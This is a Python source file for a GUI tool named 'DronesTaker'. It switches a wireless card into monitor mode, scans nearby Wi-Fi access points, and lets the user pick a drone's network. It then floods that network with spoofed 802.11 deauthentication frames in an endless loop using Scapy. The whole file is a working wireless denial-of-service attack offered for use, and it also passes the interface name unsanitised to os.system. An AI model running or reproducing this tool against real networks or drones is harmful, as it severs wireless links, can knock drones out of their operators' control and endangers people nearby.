import logging
import os
import time
from threading import Thread
from tkinter import *
import pandas
import psutil
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
from scapy.sendrecv import sniff, sendp

myFont = ("Tahoma", 11)


class DronesTaker:
    def __init__(self):
        self.root = Tk(className="DronesTaker")
        self.network_card = StringVar(value=None)
        self.attack_card = StringVar(value=None)
        self.drone_ssid = StringVar(value=None)
        self.Tree = None
        self.itemList = []
        self.drone_options = OptionMenu(self.root, self.drone_ssid, "Pick a drone")

    def conf(self):
        self.root.title("DronesTaker Module")
        self.root.geometry("560x260+480+250")
        self.root.resizable(width=False, height=False)
        iconPic = PhotoImage(file='src/ev')
        self.root.iconphoto(True, iconPic)
        self.root.option_add('*Dialog.msg.font', 'Tahoma 10')

        network_card = "Choose a network interface"
        attack_type = "Choose an attack type"

        choices = psutil.net_if_addrs()

        Label(self.root, text=network_card, font=myFont).place(x=5, y=10)
        Label(self.root, text=attack_type, font=myFont).place(x=5, y=45)
        Button(self.root, text="Scan", command=self.set_card, width=7, height=3, font=myFont).place(x=460, y=6)

        card_options = OptionMenu(self.root, self.network_card, *choices)
        card_options.config(width=21, font=myFont)
        card_options.place(x=220, y=5)

        attack_options = OptionMenu(self.root, self.attack_card, "Deauthentication packets", "ICMP")
        attack_options.config(width=21, font=myFont)
        attack_options.place(x=220, y=40)

    def set_card(self, *args):
        self.set_monitor_mode()
        scanObj = WiFiScan(self.network_card.get())
        scanObj.run()
        scanData = scanObj.getAPs()
        for row in scanData.itertuples():
            self.itemList.append([row.Index, row.SSID, row.dBm_Signal])

        drone_picker = "Choose a drone to attack"
        Label(self.root, text=drone_picker, font=myFont).place(x=5, y=85)

        self.drone_options = OptionMenu(self.root, self.drone_ssid, *self.itemList)
        self.drone_options.config(width=32, font=myFont)
        self.drone_options.place(x=220, y=80)

        Button(self.root, text="Launch An Attack", command=self.dos_attack_thread, width=58, font=myFont).place(x=5,
                                                                                                                y=120)

    def set_monitor_mode(self):
        os.system("ifconfig " + self.network_card.get() + " down")
        os.system("iwconfig " + self.network_card.get() + " mode monitor")
        os.system("ifconfig " + self.network_card.get() + " up")

    def dos_attack_thread(self):
        self.drone_ssid.set(self.drone_ssid.get()[2:self.drone_ssid.get().find(' ') - 2])

        dosThread = Thread(target=self.start_dos_thread, args=(self.network_card.get(), self.drone_ssid.get(),))
        dosThread.daemon = True
        dosThread.start()

    def start_dos_thread(self, interface, target):
        dosObj = DOSAttack(interface, target)
        dosObj.run()

    def run(self):
        self.conf()
        self.root.mainloop()


class DOSAttack:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target

    def run(self):
        dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target, addr3=self.target)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

        try:
            sendp(packet, inter=0.1, count=None, loop=1, iface=self.interface, verbose=0)
        except Exception as e:
            logging.exception(e)
            print("DOS STOPPED")


class WiFiScan:
    def __init__(self, interface):
        self.interface = interface
        self.networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
        self.networks.set_index("BSSID", inplace=True)

    def callback(self, packet):
        if packet.haslayer(Dot11Beacon):
            # extract the MAC address of the network
            myBSSID = packet[Dot11].addr2
            # get the name of it
            mySSID = packet[Dot11Elt].info.decode()
            if len(mySSID) == 0:
                mySSID = "Hidden Network Detected"
            try:
                mySignal = packet.dBm_AntSignal
            except:
                mySignal = "N/A"
            # extract network stats
            stats = packet[Dot11Beacon].network_stats()
            # get the channel of the AP
            myChannel = stats.get("channel")
            # get the crypto
            myCrypto = stats.get("crypto")
            self.networks.loc[myBSSID] = (mySSID, mySignal, myChannel, myCrypto)

    def change_channel(self):
        timeout = 12
        ch = 1
        while timeout > 0:
            os.system(f"iwconfig {self.interface} channel {ch}")
            # switch channel from 1 to 14 each 0.5s
            ch = ch % 14 + 1
            time.sleep(0.5)
            timeout = timeout - 1

    def getAPs(self):
        return self.networks.sort_values(by='dBm_Signal', ascending=False)

    def run(self):
        channel_changer = Thread(target=self.change_channel)
        channel_changer.daemon = True
        channel_changer.start()

        sniff(prn=self.callback, iface=self.interface, timeout=10)


if __name__ == '__main__':
    myObj = DronesTaker()
    myObj.run()
